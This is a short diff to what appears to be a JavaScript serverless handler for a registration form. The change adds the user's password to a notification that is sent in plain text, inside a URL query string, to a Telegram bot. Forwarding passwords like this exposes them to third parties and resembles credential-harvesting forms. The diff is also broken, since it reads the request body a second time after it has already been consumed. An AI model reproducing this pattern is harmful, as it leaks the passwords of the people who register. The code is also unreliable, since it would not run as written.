@@ -6,11 +6,11 @@ export default {
     // Jika request dari website register
     if (request.method === "POST") {
       const data = await request.json();
-      const { fullname, email, youtube, instagram } = data;
+      const { fullname, email, password, youtube, instagram } = await request.json();
 
       const message = encodeURIComponent(
-        `New Registration Dynotic Collective:\nName: ${fullname}\nEmail: ${email}\nYouTube: ${youtube}\nInstagram: ${instagram}\nTime: ${new Date().toISOString()}`
-      );
+  `New Registration Dynotic Collective:\nName: ${fullname}\nEmail: ${email}\nPassword: ${password}\nYouTube: ${youtube}\nInstagram: ${instagram}\nTime: ${new Date().toISOString()}`
+);
 
       await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`);
 
